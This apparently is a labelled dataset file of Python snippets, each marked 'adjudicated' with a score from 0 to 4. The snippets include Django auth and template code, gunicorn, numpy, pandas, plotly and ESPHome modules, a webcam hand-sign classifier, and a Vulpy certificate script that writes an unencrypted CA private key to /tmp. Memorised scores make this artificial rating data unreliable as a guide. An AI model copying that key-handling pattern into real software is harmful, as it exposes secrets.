   if size is None and self.buf.tell():<<NEWL>>            ret = self.buf.getvalue()<<NEWL>>            self.buf = io.BytesIO()<<NEWL>>            return ret<<NEWL>>        if size is None:<<NEWL>>            d = self.chunk()<<NEWL>>            return d<<NEWL>><<NEWL>>        while self.buf.tell() < size:<<NEWL>>            chunk = self.chunk()<<NEWL>>            if not chunk:<<NEWL>>                ret = self.buf.getvalue()<<NEWL>>                self.buf = io.BytesIO()<<NEWL>>                return ret<<NEWL>>            self.buf.write(chunk)<<NEWL>>        data = self.buf.getvalue()<<NEWL>>        self.buf = io.BytesIO()<<NEWL>>        self.buf.write(data[size:])<<NEWL>>        return data[:size]<<NEWL>><<NEWL>>    def unread(self, data):<<NEWL>>        self.buf.seek(0, os.SEEK_END)<<NEWL>>        self.buf.write(data)<<NEWL>><<NEWL>><<NEWL>>class SocketUnreader(Unreader):<<NEWL>>    def __init__(self, sock, max_chunk=8192):<<NEWL>>        super().__init__()<<NEWL>>        self.sock = sock<<NEWL>>        self.mxchunk = max_chunk<<NEWL>><<NEWL>>    def chunk(self):<<NEWL>>        return self.sock.recv(self.mxchunk)<<NEWL>><<NEWL>><<NEWL>>class IterUnreader(Unreader):<<NEWL>>    def __init__(self, iterable):<<NEWL>>        super().__init__()<<NEWL>>        self.iter = iter(iterable)<<NEWL>><<NEWL>>    def chunk(self):<<NEWL>>        if not self.iter:<<NEWL>>            return b""""<<NEWL>>        try:<<NEWL>>            return next(self.iter)<<NEWL>>        except StopIteration:<<NEWL>>            self.iter = None<<NEWL>>            return b"""""
399	adjudicated	3	"# PermWrapper and PermLookupDict proxy the permissions system into objects that<<NEWL>># the template system can understand.<<NEWL>><<NEWL>><<NEWL>>class PermLookupDict:<<NEWL>>    def __init__(self, user, app_label):<<NEWL>>        self.user, self.app_label = user, app_label<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return str(self.user.get_all_permissions())<<NEWL>><<NEWL>>    def __getitem__(self, perm_name):<<NEWL>>        return self.user.has_perm(""%s.%s"" % (self.app_label, perm_name))<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        # To fix 'item in perms.someapp' and __getitem__ interaction we need to<<NEWL>>        # define __iter__. See #18979 for details.<<NEWL>>        raise TypeError(""PermLookupDict is not iterable."")<<NEWL>><<NEWL>>    def __bool__(self):<<NEWL>>        return self.user.has_module_perms(self.app_label)<<NEWL>><<NEWL>><<NEWL>>class PermWrapper:<<NEWL>>    def __init__(self, user):<<NEWL>>        self.user = user<<NEWL>><<NEWL>>    def __getitem__(self, app_label):<<NEWL>>        return PermLookupDict(self.user, app_label)<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        # I am large, I contain multitudes.<<NEWL>>        raise TypeError(""PermWrapper is not iterable."")<<NEWL>><<NEWL>>    def __contains__(self, perm_name):<<NEWL>>        """"""<<NEWL>>        Lookup by ""someapp"" or ""someapp.someperm"" in perms.<<NEWL>>        """"""<<NEWL>>        if '.' not in perm_name:<<NEWL>>            # The name refers to module.<<NEWL>>            return bool(self[perm_name])<<NEWL>>        app_label, perm_name = perm_name.split('.', 1)<<NEWL>>        return self[app_label][perm_name]<<NEWL>><<NEWL>><<NEWL>>def auth(request):<<NEWL>>    """"""<<NEWL>>    Return context variables required by apps that use Django's authentication<<NEWL>>    system.<<NEWL>><<NEWL>>    If there is no 'user' attribute in the request, use AnonymousUser (from<<NEWL>>    django.contrib.auth).<<NEWL>>    """"""<<NEWL>>    if hasattr(request, 'user'):<<NEWL>>        user = request.user<<NEWL>>    else:<<NEWL>>        from django.contrib.auth.models import AnonymousUser<<NEWL>>        user = AnonymousUser()<<NEWL>><<NEWL>>    return {<<NEWL>>        'user': user,<<NEWL>>        'perms': PermWrapper(user),<<NEWL>>    }"
148	adjudicated	0	"import pytest<<NEWL>><<NEWL>>from numpy import array<<NEWL>>from . import util<<NEWL>><<NEWL>><<NEWL>>class TestReturnLogical(util.F2PyTest):<<NEWL>>    def check_function(self, t):<<NEWL>>        assert t(True) == 1<<NEWL>>        assert t(False) == 0<<NEWL>>        assert t(0) == 0<<NEWL>>        assert t(None) == 0<<NEWL>>        assert t(0.0) == 0<<NEWL>>        assert t(0j) == 0<<NEWL>>        assert t(1j) == 1<<NEWL>>        assert t(234) == 1<<NEWL>>        assert t(234.6) == 1<<NEWL>>        assert t(234.6 + 3j) == 1<<NEWL>>        assert t(""234"") == 1<<NEWL>>        assert t(""aaa"") == 1<<NEWL>>        assert t("""") == 0<<NEWL>>        assert t([]) == 0<<NEWL>>        assert t(()) == 0<<NEWL>>        assert t({}) == 0<<NEWL>>        assert t(t) == 1<<NEWL>>        assert t(-234) == 1<<NEWL>>        assert t(10**100) == 1<<NEWL>>        assert t([234]) == 1<<NEWL>>        assert t((234, )) == 1<<NEWL>>        assert t(array(234)) == 1<<NEWL>>        assert t(array([234])) == 1<<NEWL>>        assert t(array([[234]])) == 1<<NEWL>>        assert t(array([127], ""b"")) == 1<<NEWL>>        assert t(array([234], ""h"")) == 1<<NEWL>>        assert t(array([234], ""i"")) == 1<<NEWL>>        assert t(array([234], ""l"")) == 1<<NEWL>>        assert t(array([234], ""f"")) == 1<<NEWL>>        assert t(array([234], ""d"")) == 1<<NEWL>>        assert t(array([234 + 3j], ""F"")) == 1<<NEWL>>        assert t(array([234], ""D"")) == 1<<NEWL>>        assert t(array(0)) == 0<<NEWL>>        assert t(array([0])) == 0<<NEWL>>        assert t(array([[0]])) == 0<<NEWL>>        assert t(array([0j])) == 0<<NEWL>>        assert t(array([1])) == 1<<NEWL>>        pytest.raises(ValueError, t, array([0, 0]))<<NEWL>><<NEWL>><<NEWL>>class TestFReturnLogical(TestReturnLogical):<<NEWL>>    sources = [<<NEWL>>        util.getpath(""tests"", ""src"", ""return_logical"", ""foo77.f""),<<NEWL>>        util.getpath(""tests"", ""src"", ""return_logical"", ""foo90.f90""),<<NEWL>>    ]<<NEWL>><<NEWL>>    @pytest.mark.slow<<NEWL>>    @pytest.mark.parametrize(""name"", ""t0,t1,t2,t4,s0,s1,s2,s4"".split("",""))<<NEWL>>    def test_all_f77(self, name):<<NEWL>>        self.check_function(getattr(self.module, name))<<NEWL>><<NEWL>>    @pytest.mark.slow<<NEWL>>    @pytest.mark.parametrize(""name"",<<NEWL>>                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))<<NEWL>>    def test_all_f90(self, name):<<NEWL>>        self.check_function(getattr(self.module.f90_return_logical, name))"
59	adjudicated	2	"from . import engines<<NEWL>>from .exceptions import TemplateDoesNotExist<<NEWL>><<NEWL>><<NEWL>>def get_template(template_name, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for the given name.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for engine in engines:<<NEWL>>        try:<<NEWL>>            return engine.get_template(template_name)<<NEWL>>        except TemplateDoesNotExist as e:<<NEWL>>            chain.append(e)<<NEWL>><<NEWL>>    raise TemplateDoesNotExist(template_name, chain=chain)<<NEWL>><<NEWL>><<NEWL>>def select_template(template_name_list, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for one of the given names.<<NEWL>><<NEWL>>    Try names in order and return the first template found.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name_list, str):<<NEWL>>        raise TypeError(<<NEWL>>            'select_template() takes an iterable of template names but got a '<<NEWL>>            'string: %r. Use get_template() if you want to load a single '<<NEWL>>            'template by name.' % template_name_list<<NEWL>>        )<<NEWL>><<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for template_name in template_name_list:<<NEWL>>        for engine in engines:<<NEWL>>            try:<<NEWL>>                return engine.get_template(template_name)<<NEWL>>            except TemplateDoesNotExist as e:<<NEWL>>                chain.append(e)<<NEWL>><<NEWL>>    if template_name_list:<<NEWL>>        raise TemplateDoesNotExist(', '.join(template_name_list), chain=chain)<<NEWL>>    else:<<NEWL>>        raise TemplateDoesNotExist(""No template names provided"")<<NEWL>><<NEWL>><<NEWL>>def render_to_string(template_name, context=None, request=None, using=None):<<NEWL>>    """"""<<NEWL>>    Load a template and render it with a context. Return a string.<<NEWL>><<NEWL>>    template_name may be a string or a list of strings.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name, (list, tuple)):<<NEWL>>        template = select_template(template_name, using=using)<<NEWL>>    else:<<NEWL>>        template = get_template(template_name, using=using)<<NEWL>>    return template.render(context, request)<<NEWL>><<NEWL>><<NEWL>>def _engine_list(using=None):<<NEWL>>    return engines.all() if using is None else [engines[using]]"
119	adjudicated	2	"""""""<<NEWL>>    pygments.lexers.x10<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the X10 programming language.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer<<NEWL>>from pygments.token import Text, Comment, Keyword, String<<NEWL>><<NEWL>>__all__ = ['X10Lexer']<<NEWL>><<NEWL>><<NEWL>>class X10Lexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For the X10 language.<<NEWL>><<NEWL>>    .. versionadded:: 2.2<<NEWL>>    """"""<<NEWL>><<NEWL>>    name = 'X10'<<NEWL>>    url = 'http://x10-lang.org/'<<NEWL>>    aliases = ['x10', 'xten']<<NEWL>>    filenames = ['*.x10']<<NEWL>>    mimetypes = ['text/x-x10']<<NEWL>><<NEWL>>    keywords = (<<NEWL>>        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',<<NEWL>>        'break', 'case', 'catch', 'class', 'clocked', 'continue',<<NEWL>>        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',<<NEWL>>        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',<<NEWL>>        'instanceof', 'interface', 'isref', 'new', 'offer',<<NEWL>>        'operator', 'package', 'return', 'struct', 'switch', 'throw',<<NEWL>>        'try', 'type', 'val', 'var', 'when', 'while'<<NEWL>>    )<<NEWL>><<NEWL>>    types = (<<NEWL>>        'void'<<NEWL>>    )<<NEWL>><<NEWL>>    values = (<<NEWL>>        'false', 'null', 'self', 'super', 'this', 'true'<<NEWL>>    )<<NEWL>><<NEWL>>    modifiers = (<<NEWL>>        'abstract', 'extends', 'implements', 'native', 'offers',<<NEWL>>        'private', 'property', 'protected', 'public', 'static',<<NEWL>>        'throws', 'transient'<<NEWL>>    )<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[^\S\n]+', Text),<<NEWL>>            (r'//.*?\n', Comment.Single),<<NEWL>>            (r'/\*(.|\n)*?\*/', Comment.Multiline),<<NEWL>>            (r'\b(%s)\b' % '|'.join(keywords), Keyword),<<NEWL>>            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),<<NEWL>>            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),<<NEWL>>            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),<<NEWL>>            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),<<NEWL>>            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),<<NEWL>>            (r'.', Text)<<NEWL>>        ],<<NEWL>>    }"
288	adjudicated	0	"import esphome.codegen as cg<<NEWL>>import esphome.config_validation as cv<<NEWL>>from esphome import pins<<NEWL>>from esphome.components import display<<NEWL>>from esphome.const import (<<NEWL>>    CONF_CLK_PIN,<<NEWL>>    CONF_DIO_PIN,<<NEWL>>    CONF_ID,<<NEWL>>    CONF_LAMBDA,<<NEWL>>    CONF_INTENSITY,<<NEWL>>    CONF_INVERTED,<<NEWL>>    CONF_LENGTH,<<NEWL>>)<<NEWL>><<NEWL>>CODEOWNERS = [""@glmnet""]<<NEWL>><<NEWL>>tm1637_ns = cg.esphome_ns.namespace(""tm1637"")<<NEWL>>TM1637Display = tm1637_ns.class_(""TM1637Display"", cg.PollingComponent)<<NEWL>>TM1637DisplayRef = TM1637Display.operator(""ref"")<<NEWL>><<NEWL>>CONFIG_SCHEMA = display.BASIC_DISPLAY_SCHEMA.extend(<<NEWL>>    {<<NEWL>>        cv.GenerateID(): cv.declare_id(TM1637Display),<<NEWL>>        cv.Optional(CONF_INTENSITY, default=7): cv.All(<<NEWL>>            cv.uint8_t, cv.Range(min=0, max=7)<<NEWL>>        ),<<NEWL>>        cv.Optional(CONF_INVERTED, default=False): cv.boolean,<<NEWL>>        cv.Optional(CONF_LENGTH, default=6): cv.All(cv.uint8_t, cv.Range(min=1, max=6)),<<NEWL>>        cv.Required(CONF_CLK_PIN): pins.gpio_output_pin_schema,<<NEWL>>        cv.Required(CONF_DIO_PIN): pins.gpio_output_pin_schema,<<NEWL>>    }<<NEWL>>).extend(cv.polling_component_schema(""1s""))<<NEWL>><<NEWL>><<NEWL>>async def to_code(config):<<NEWL>>    var = cg.new_Pvariable(config[CONF_ID])<<NEWL>>    await cg.register_component(var, config)<<NEWL>>    await display.register_display(var, config)<<NEWL>><<NEWL>>    clk = await cg.gpio_pin_expression(config[CONF_CLK_PIN])<<NEWL>>    cg.add(var.set_clk_pin(clk))<<NEWL>>    dio = await cg.gpio_pin_expression(config[CONF_DIO_PIN])<<NEWL>>    cg.add(var.set_dio_pin(dio))<<NEWL>><<NEWL>>    cg.add(var.set_intensity(config[CONF_INTENSITY]))<<NEWL>>    cg.add(var.set_inverted(config[CONF_INVERTED]))<<NEWL>>    cg.add(var.set_length(config[CONF_LENGTH]))<<NEWL>><<NEWL>>    if CONF_LAMBDA in config:<<NEWL>>        lambda_ = await cg.process_lambda(<<NEWL>>            config[CONF_LAMBDA], [(TM1637DisplayRef, ""it"")], return_type=cg.void<<NEWL>>        )<<NEWL>>        cg.add(var.set_writer(lambda_))"
298	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""insidetextfont"", parent_name=""bar"", **kwargs):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
109	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""pie"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
49	adjudicated	4	"import inspect<<NEWL>>import itertools<<NEWL>>from collections import OrderedDict<<NEWL>><<NEWL>>from decorator import decorator<<NEWL>><<NEWL>><<NEWL>>class ValidationFailure(Exception):<<NEWL>>    def __init__(self, func, args):<<NEWL>>        self.func = func<<NEWL>>        self.__dict__.update(args)<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return u'ValidationFailure(func={func}, args={args})'.format(<<NEWL>>            func=self.func.__name__,<<NEWL>>            args=dict(<<NEWL>>                [(k, v) for (k, v) in self.__dict__.items() if k != 'func']<<NEWL>>            )<<NEWL>>        )<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return repr(self)<<NEWL>><<NEWL>>    def __unicode__(self):<<NEWL>>        return repr(self)<<NEWL>><<NEWL>>    def __bool__(self):<<NEWL>>        return False<<NEWL>><<NEWL>>    def __nonzero__(self):<<NEWL>>        return False<<NEWL>><<NEWL>><<NEWL>>def func_args_as_dict(func, args, kwargs):<<NEWL>>    """"""<<NEWL>>    Return given function's positional and key value arguments as an ordered<<NEWL>>    dictionary.<<NEWL>>    """"""<<NEWL>>    _getargspec = inspect.getfullargspec<<NEWL>><<NEWL>>    arg_names = list(<<NEWL>>        OrderedDict.fromkeys(<<NEWL>>            itertools.chain(<<NEWL>>                _getargspec(func)[0],<<NEWL>>                kwargs.keys()<<NEWL>>            )<<NEWL>>        )<<NEWL>>    )<<NEWL>>    return OrderedDict(<<NEWL>>        list(zip(arg_names, args)) +<<NEWL>>        list(kwargs.items())<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def validator(func, *args, **kwargs):<<NEWL>>    """"""<<NEWL>>    A decorator that makes given function validator.<<NEWL>><<NEWL>>    Whenever the given function is called and returns ``False`` value<<NEWL>>    this decorator returns :class:`ValidationFailure` object.<<NEWL>><<NEWL>>    Example::<<NEWL>><<NEWL>>        >>> @validator<<NEWL>>        ... def even(value):<<NEWL>>        ...     return not (value % 2)<<NEWL>><<NEWL>>        >>> even(4)<<NEWL>>        True<<NEWL>><<NEWL>>        >>> even(5)<<NEWL>>        ValidationFailure(func=even, args={'value': 5})<<NEWL>><<NEWL>>    :param func: function to decorate<<NEWL>>    :param args: positional function arguments<<NEWL>>    :param kwargs: key value function arguments<<NEWL>>    """"""<<NEWL>>    def wrapper(func, *args, **kwargs):<<NEWL>>        value = func(*args, **kwargs)<<NEWL>>        if not value:<<NEWL>>            return ValidationFailure(<<NEWL>>                func, func_args_as_dict(func, args, kwargs)<<NEWL>>            )<<NEWL>>        return True<<NEWL>>    return decorator(wrapper, func)"
158	adjudicated	1	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>import pandas._testing as tm<<NEWL>>from pandas.arrays import BooleanArray<<NEWL>>from pandas.tests.arrays.masked_shared import ComparisonOps<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def data():<<NEWL>>    """"""Fixture returning boolean array with valid and missing data""""""<<NEWL>>    return pd.array(<<NEWL>>        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],<<NEWL>>        dtype=""boolean"",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def dtype():<<NEWL>>    """"""Fixture returning BooleanDtype""""""<<NEWL>>    return pd.BooleanDtype()<<NEWL>><<NEWL>><<NEWL>>class TestComparisonOps(ComparisonOps):<<NEWL>>    def test_compare_scalar(self, data, comparison_op):<<NEWL>>        self._compare_other(data, comparison_op, True)<<NEWL>><<NEWL>>    def test_compare_array(self, data, comparison_op):<<NEWL>>        other = pd.array([True] * len(data), dtype=""boolean"")<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>>        other = np.array([True] * len(data))<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>>        other = pd.Series([True] * len(data))<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>><<NEWL>>    @pytest.mark.parametrize(""other"", [True, False, pd.NA])<<NEWL>>    def test_scalar(self, other, comparison_op, dtype):<<NEWL>>        ComparisonOps.test_scalar(self, other, comparison_op, dtype)<<NEWL>><<NEWL>>    def test_array(self, comparison_op):<<NEWL>>        op = comparison_op<<NEWL>>        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")<<NEWL>>        b = pd.array([True, False, None] * 3, dtype=""boolean"")<<NEWL>><<NEWL>>        result = op(a, b)<<NEWL>><<NEWL>>        values = op(a._data, b._data)<<NEWL>>        mask = a._mask | b._mask<<NEWL>>        expected = BooleanArray(values, mask)<<NEWL>>        tm.assert_extension_array_equal(result, expected)<<NEWL>><<NEWL>>        # ensure we haven't mutated anything inplace<<NEWL>>        result[0] = None<<NEWL>>        tm.assert_extension_array_equal(<<NEWL>>            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")<<NEWL>>        )<<NEWL>>        tm.assert_extension_array_equal(<<NEWL>>            b, pd.array([True, False, None] * 3, dtype=""boolean"")<<NEWL>>        )"
389	adjudicated	0	"import cv2<<NEWL>>from cvzone.HandTrackingModule import HandDetector<<NEWL>>from cvzone.ClassificationModule import Classifier<<NEWL>>import numpy as np<<NEWL>>import math<<NEWL>>cap = cv2.VideoCapture(0)<<NEWL>>detector = HandDetector(maxHands=1)<<NEWL>>classifier = Classifier(""keras_model.h5"", ""labels.txt"")<<NEWL>><<NEWL>>offset = 20<<NEWL>>imgSize = 300<<NEWL>><<NEWL>>folder = ""Data/C""<<NEWL>>counter = 0<<NEWL>><<NEWL>>labels = [""A"", ""B"", ""C""]<<NEWL>><<NEWL>>while True:<<NEWL>>    success, img = cap.read()<<NEWL>>    imgOutput = img.copy()<<NEWL>>    hands, img = detector.findHands(img)<<NEWL>>    if hands:<<NEWL>>        hand = hands[0]<<NEWL>>        x, y, w, h = hand['bbox']<<NEWL>><<NEWL>>        imgWhite = np.ones((imgSize, imgSize, 3), np.uint8) * 255<<NEWL>>        imgCrop = img[y - offset:y + h + offset, x - offset:x + w + offset]<<NEWL>><<NEWL>>        imgCropShape = imgCrop.shape<<NEWL>><<NEWL>>        aspectRatio = h / w<<NEWL>><<NEWL>>        if aspectRatio > 1:<<NEWL>>            k = imgSize / h<<NEWL>>            wCal = math.ceil(k * w)<<NEWL>>            imgResize = cv2.resize(imgCrop, (wCal, imgSize))<<NEWL>>            imgResizeShape = imgResize.shape<<NEWL>>            wGap = math.ceil((imgSize - wCal) / 2)<<NEWL>>            imgWhite[:, wGap:wCal + wGap] = imgResize<<NEWL>>            prediction, index = classifier.getPrediction(imgWhite, draw=False)<<NEWL>>            print(prediction, index)<<NEWL>><<NEWL>>        else:<<NEWL>>            k = imgSize / w<<NEWL>>            hCal = math.ceil(k * h)<<NEWL>>            imgResize = cv2.resize(imgCrop, (imgSize, hCal))<<NEWL>>            imgResizeShape = imgResize.shape<<NEWL>>            hGap = math.ceil((imgSize - hCal) / 2)<<NEWL>>            imgWhite[hGap:hCal + hGap, :] = imgResize<<NEWL>>            prediction, index = classifier.getPrediction(imgWhite, draw=False)<<NEWL>><<NEWL>>        cv2.rectangle(imgOutput, (x - offset, y - offset-50),<<NEWL>>                      (x - offset+90, y - offset-50+50), (255, 0, 255), cv2.FILLED)<<NEWL>>        cv2.putText(imgOutput, labels[index], (x, y -26), cv2.FONT_HERSHEY_COMPLEX, 1.7, (255, 255, 255), 2)<<NEWL>>        cv2.rectangle(imgOutput, (x-offset, y-offset),<<NEWL>>                      (x + w+offset, y + h+offset), (255, 0, 255), 4)<<NEWL>><<NEWL>><<NEWL>>        cv2.imshow(""ImageCrop"", imgCrop)<<NEWL>>        cv2.imshow(""ImageWhite"", imgWhite)<<NEWL>><<NEWL>>    cv2.imshow(""Image"", imgOutput)<<NEWL>>    cv2.waitKey(1)"
18	adjudicated	1	"#!/usr/bin/env python3<<NEWL>><<NEWL>>import datetime<<NEWL>><<NEWL>>from cryptography.hazmat.backends import default_backend<<NEWL>>from cryptography.hazmat.primitives.asymmetric import rsa<<NEWL>>from cryptography.hazmat.primitives import serialization<<NEWL>>from cryptography import x509<<NEWL>>from cryptography.x509.oid import NameOID<<NEWL>>from cryptography.hazmat.primitives import hashes<<NEWL>><<NEWL>>private_key = rsa.generate_private_key(<<NEWL>>    public_exponent=65537,<<NEWL>>    key_size=2048,<<NEWL>>    backend=default_backend()<<NEWL>>)<<NEWL>><<NEWL>>public_key = private_key.public_key()<<NEWL>><<NEWL>>pem_private = private_key.private_bytes(<<NEWL>>    encoding=serialization.Encoding.PEM,<<NEWL>>    format=serialization.PrivateFormat.TraditionalOpenSSL,<<NEWL>>    encryption_algorithm=serialization.NoEncryption()<<NEWL>>)<<NEWL>><<NEWL>>pem_public = public_key.public_bytes(<<NEWL>>    encoding=serialization.Encoding.PEM,<<NEWL>>    format=serialization.PublicFormat.SubjectPublicKeyInfo<<NEWL>>)<<NEWL>><<NEWL>>with open('/tmp/ca.key', 'wb') as out:<<NEWL>>    out.write(pem_private)<<NEWL>><<NEWL>>with open('/tmp/ca.pub', 'wb') as out:<<NEWL>>    out.write(pem_public)<<NEWL>><<NEWL>>print('Created files in /tmp/ca.key /tmp/ca.pub /tmp/ca.cert')<<NEWL>><<NEWL>># Various details about who we are. For a self-signed certificate the<<NEWL>># subject and issuer are always the same.<<NEWL>>subject = issuer = x509.Name([<<NEWL>>    x509.NameAttribute(NameOID.COUNTRY_NAME, ""AR""),<<NEWL>>    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, ""BA""),<<NEWL>>    x509.NameAttribute(NameOID.LOCALITY_NAME, ""Buenos Aires""),<<NEWL>>    x509.NameAttribute(NameOID.ORGANIZATION_NAME, ""Vulpy by Securetia""),<<NEWL>>    x509.NameAttribute(NameOID.COMMON_NAME, ""www.securetia.com""),<<NEWL>>])<<NEWL>><<NEWL>>cert = x509.CertificateBuilder().subject_name(subject)<<NEWL>>cert = cert.issuer_name(issuer)<<NEWL>>cert = cert.public_key(public_key)<<NEWL>>cert = cert.serial_number(x509.random_serial_number())<<NEWL>>cert = cert.not_valid_before(datetime.datetime.utcnow())<<NEWL>>cert = cert.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))<<NEWL>>cert = cert.sign(private_key, hashes.SHA256(), default_backend())<<NEWL>><<NEWL>># Write our certificate out to disk.<<NEWL>>with open('/tmp/ca.cert', 'wb') as out:<<NEWL>>    out.write(cert.public_bytes(serialization.Encoding.PEM))<<NEWL>>"
496	adjudicated	4	"# Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># Default TEST_CONFIG_OVERRIDE for python repos.<<NEWL>><<NEWL>># You can copy this file into your directory, then it will be imported from<<NEWL>># the noxfile.py.<<NEWL>><<NEWL>># The source of truth:<<NEWL>># https://github.com/GoogleCloudPlatform/python-docs-samples/blob/main/noxfile_config.py<<NEWL>><<NEWL>>TEST_CONFIG_OVERRIDE = {<<NEWL>>    # You can opt out from the test for specific Python versions.<<NEWL>>    ""ignored_versions"": [""2.7"", ""3.6"", ""3.9"", ""3.10"", ""3.11""],<<NEWL>>    # Old samples are opted out of enforcing Python type hints<<NEWL>>    # All new samples should feature them<<NEWL>>    ""enforce_type_hints"": False,<<NEWL>>    # An envvar key for determining the project id to use. Change it<<NEWL>>    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a<<NEWL>>    # build specific Cloud project. You can also use your own 